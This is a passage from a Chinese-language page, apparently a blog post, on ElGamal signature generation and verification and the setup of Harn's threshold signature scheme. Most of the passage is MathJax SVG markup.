data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(2784.7, 0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(3509.9, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(4510.1, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(5010.1, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5676.9, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(6732.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>。计算：</p>
<script type="math/tex; mode=display">r=g^k\bmod p</script><script type="math/tex; mode=display">s=(m-xr)k^{-1}\bmod p</script><p>将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 878 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>的签名<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="4.848ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2142.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(840, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1284.7, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(1753.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>发送给Bob。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>Bob收到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="4.848ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2142.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(840, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1284.7, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(1753.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，利用Alice的公钥<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>验证等式：</p>
<script type="math/tex; mode=display">g^m\equiv y^rr^s\bmod p</script><p>若等式成立则签名有效。</p>
<h1 id="Harn-的门限签名方案"><a href="#Harn-的门限签名方案" class="headerlink" title="Harn 的门限签名方案"></a>Harn 的门限签名方案</h1><h2 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h2><p>假设有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>个成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="13.303ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 5880 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(642, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1045.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1490.2, 0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(642, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2535.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(2980.4, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(4319.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4763.8, 0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.817ex" height="1.441ex" role="img" focusable="false" viewBox="0 -626 361 637"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></svg></mjx-container>为门限值，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="1.138ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 503 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="1.041ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 460 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>为大素数，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="8.465ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3741.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(460, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(738, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1127, 0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(1852.2, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2852.4, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3352.4, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="1.079ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 477 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g></g></g></svg></mjx-container>为有限域<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex" xmlns="http://www.w3.org/2000/svg" width="2.463ex" height="2.195ex" role="img" focusable="false" viewBox="0 -683 1088.7 970.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(683, -150) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></g></svg></mjx-container>上的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="1.041ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 460 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>阶生成元，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" 